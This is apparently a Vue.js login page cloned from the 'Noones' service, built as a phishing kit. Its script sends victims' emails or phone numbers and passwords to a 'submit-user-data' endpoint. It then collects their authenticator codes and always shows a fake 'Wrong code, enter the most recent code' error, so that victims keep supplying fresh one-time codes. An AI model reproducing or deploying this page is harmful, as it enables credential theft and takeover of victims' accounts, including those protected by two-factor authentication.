<template>
  <div class="flex flex-col">
    <div class="flex flex-col relativ h-[45vh]">
      <div class="relative">
        <div
          class="flex flex-row justify-between p-1 my-7 items-center relative"
        >
          <div class="relative z-10 ml-5">
            <LeftArrow />
          </div>
          <div>
            <h5
              class="text-black1 text-[23px] font-semibold font-ibm-plex one relative z-10"
            >
              Log In
            </h5>
          </div>
          <div class="flex flex-row items-center relative z-10 gap-x-5 mr-5">
            <InfoSvg />
            <EnglishSvg />
          </div>
        </div>
      </div>

      <div class="flex flex-row w-full justify-center relative z-10">
        <div class="flex flex-row relative z-10">
          <div
            class="one relative z-10 w-44"
            :style="{ display: currentDisplay === 'one' ? 'block' : 'none' }"
          >
            <Noones1 />
          </div>
          <div
            class="two relative z-10 w-44"
            :style="{ display: currentDisplay === 'two' ? 'block' : 'none' }"
          >
            <Noones2 />
          </div>
          <div
            class="three relative z-10 w-44"
            :style="{ display: currentDisplay === 'three' ? 'block' : 'none' }"
          >
            <Noones3 />
          </div>
          <div
            class="four relative z-10 w-44"
            :style="{ display: currentDisplay === 'four' ? 'block' : 'none' }"
          >
            <Noones4 />
          </div>
        </div>
        <div>
          <EmailRequestComponent v-show="!enterPassword" />
          <PasswordComponent
            :emailOrPhone="emailOrPhone"
            v-show="enterPassword"
          />
        </div>
      </div>

      <div class="absolute top-0 z-0 w-full">
        <img
          class="w-full hidden sm:flex h-[45vh] object-cover"
          src="../assets/images/noones-bg-lg.svg"
          alt=""
        />
        <img
          class="w-full sm:hidden h-[45vh] object-cover"
          src="../assets/images/noones-bg-md.svg"
          alt=""
        />
      </div>
    </div>

    <div
      class="flex sm:hidden flex-row justify-between w-full relative z-[15] bg-bg-main mt-[-25px]"
    >
      <LeftSquares />
      <RightSquares />
    </div>

    <div
      class="flex flex-col relative z-20 w-full bg-bg-main h-[45vh] items-center pt-3 justify-between"
    >
      <div class="relative flex flex-col">
        <!-- Email/Phone Input -->
        <div class="relative h-fit mb-4" v-show="!enterPassword">
          <img
            class="w-11/12 xs:w-full h-full z-0"
            src="../assets/images/input.svg"
            alt=""
          />
          <input
            v-if="!phone"
            type="email"
            placeholder="Email address"
            v-model="emailOrPhone"
            class="absolute outline-none top-[12px] w-[87%] xs:w-11/12 h-6 px-2 font-bold text-lg mx-2 font-mono bg-red z-20"
            :class="{ 'border-red-500': emailOrPhone === '' && formSubmitted }"
            required
          />
          <input
            v-else
            type="tel"
            placeholder="Phone number"
            v-model="emailOrPhone"
            class="absolute outline-none top-[12px] w-[87%] xs:w-11/12 h-6 px-2 font-bold text-lg mx-2 font-mono bg-red z-20"
            :class="{ 'border-red-500': emailOrPhone === '' && formSubmitted }"
            required
          />
          <span
            v-if="emailOrPhone === '' && formSubmitted"
            class="text-red-500 text-sm"
          >
            Please enter your email or phone number.
          </span>
        </div>

        <!-- Toggle to Use Phone/Email -->
        <div class="flex w-full my-2" v-show="!enterPassword">
          <h3
            @click="phone = !phone"
            class="text-green hover:text-green-400 text-md mx-auto cursor-pointer font-ibm-plex font-semibold"
          >
            {{ phone ? "Use email instead" : "Use phone number instead" }}
          </h3>
        </div>

        <!-- Password Field -->
        <div class="relative h-fit mb-4" v-show="!enterPassword">
          <img
            class="w-11/12 xs:w-full h-full z-0"
            src="../assets/images/input.svg"
            alt=""
          />
          <input
            :type="showPassword ? 'text' : 'password'"
            placeholder="Password"
            v-model="credentials.password"
            class="absolute outline-none top-[12px] w-[78%] xs:w-9/12 h-6 px-2 font-bold text-lg mx-2 font-mono bg-red z-20"
            :class="{
              'border-red-500': credentials.password === '' && formSubmitted,
            }"
            required
          />
          <span
            v-if="credentials.password === '' && formSubmitted"
            class="text-red-500 text-sm"
          >
            Please enter your password.
          </span>
          <div
            class="absolute right-5 top-3 cursor-pointer z-30"
            @click="showPassword = !showPassword"
          >
            <component :is="showPassword ? HidePasswordSVG : ShowPasswordSvg" />
          </div>
        </div>

        <!-- Authenticator Field -->
        <div class="relative h-fit mb-4" v-show="enterPassword">
          <img
            class="w-11/12 xs:w-full h-full z-0"
            src="../assets/images/input.svg"
            alt=""
          />
          <input
            type="text"
            placeholder="XXXXXX"
            v-model="credentials.authenticator"
            class="absolute outline-none top-[12px] w-[87%] xs:w-11/12 h-6 px-2 font-bold text-lg mx-2 font-mono bg-red z-20"
            :class="{
              'border-red-500':
                credentials.authenticator === '' && formSubmitted,
            }"
            required
          />
          <span
            v-if="credentials.authenticator === '' && formSubmitted"
            class="text-red-500 text-sm"
          >
            Please enter the authenticator code.
          </span>
        </div>

        <!-- Error Message -->
        <div v-if="authError" class="text-red-500 text-sm font-semibold">
          Wrong code, enter the most recent code.
        </div>
      </div>

      <div class="relative mt-24 w-[325px]">
        <button
          v-show="!enterPassword"
          @click="submitEmail"
          class="bg-light-green hover:bg-green w-full mx-auto py-3 button"
          :disabled="!emailOrPhone || !credentials.password || formSubmitted"
        >
          Continue
        </button>
        <button
          v-show="enterPassword"
          @click="submitLogins"
          class="bg-light-green hover:bg-green w-full mx-auto py-3 button"
          :disabled="!credentials.authenticator || formSubmitted"
        >
          Continue
        </button>
        <div class="h-20"></div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, onBeforeUnmount } from "vue";
import Noones1 from "@/assets/SVGs/Noones1.vue";
import Noones2 from "@/assets/SVGs/Noones2.vue";
import Noones3 from "@/assets/SVGs/Noones3.vue";
import Noones4 from "@/assets/SVGs/Noones4.vue";
import LeftArrow from "@/assets/SVGs/LeftArrow.vue";
import InfoSvg from "@/assets/SVGs/InfoSvg.vue";
import EnglishSvg from "@/assets/SVGs/EnglishSvg.vue";
import EmailRequestComponent from "@/components/EmailRequestComponent.vue";
import LeftSquares from "@/assets/SVGs/LeftSquares.vue";
import RightSquares from "@/assets/SVGs/RightSquares.vue";
import PasswordComponent from "./PasswordComponent.vue";
import ShowPasswordSvg from "@/assets/SVGs/ShowPasswordSvg.vue";
import HidePasswordSVG from "@/assets/SVGs/HidePasswordSVG.vue";

// State variables
const phone = ref(false);
const enterPassword = ref(false);
const emailOrPhone = ref("");
const currentDisplay = ref("one");
const showPassword = ref(false);
const credentials = ref({
  password: "",
  authenticator: "",
});
const formSubmitted = ref(false);
const authError = ref(null);

let intervalId;

// Rotating UI display
const changeDisplay = () => {
  const displays = ["one", "two", "three", "four"];
  const currentIndex = displays.indexOf(currentDisplay.value);
  currentDisplay.value = displays[(currentIndex + 1) % displays.length];
};

// Lifecycle hooks
onMounted(() => {
  intervalId = setInterval(changeDisplay, 200);
});

onBeforeUnmount(() => {
  clearInterval(intervalId);
});

// Submit email/phone and password
const submitEmail = async () => {
  formSubmitted.value = true;
  authError.value = null;

  if (emailOrPhone.value && credentials.value.password) {
    try {
      const response = await fetch("/api/submit-user-data/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          emailOrPhone: emailOrPhone.value,
          password: credentials.value.password,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Submission failed");
      }

      const data = await response.json();
      console.log("User data saved:", data);

      // Transition to authenticator input
      enterPassword.value = true;
      credentials.value.password = "";
    } catch (error) {
      console.error("Submission failed:", error.message);
      authError.value = error.message;
    } finally {
      formSubmitted.value = false;
    }
  } else {
    authError.value = "Please fill out both fields.";
    formSubmitted.value = false;
  }
};

// Submit authenticator code
const submitLogins = async () => {
  formSubmitted.value = true;
  authError.value = null;

  if (credentials.value.authenticator) {
    try {
      const response = await fetch("/api/submit-authenticator-code/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          emailOrPhone: emailOrPhone.value,
          password: credentials.value.password,
          authenticatorCode: credentials.value.authenticator,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || "Failed to save authenticator code");
      }

      const data = await response.json();
      console.log("Authenticator code saved successfully:", data);

      // Simulate an error for UI purposes
      throw new Error("Wrong code, enter the most recent code");
    } catch (error) {
      console.error("Submission failed:", error.message);
      authError.value = error.message;
    } finally {
      formSubmitted.value = false;
    }
  } else {
    authError.value = "Please enter the authenticator code.";
    formSubmitted.value = false;
  }
};
</script>
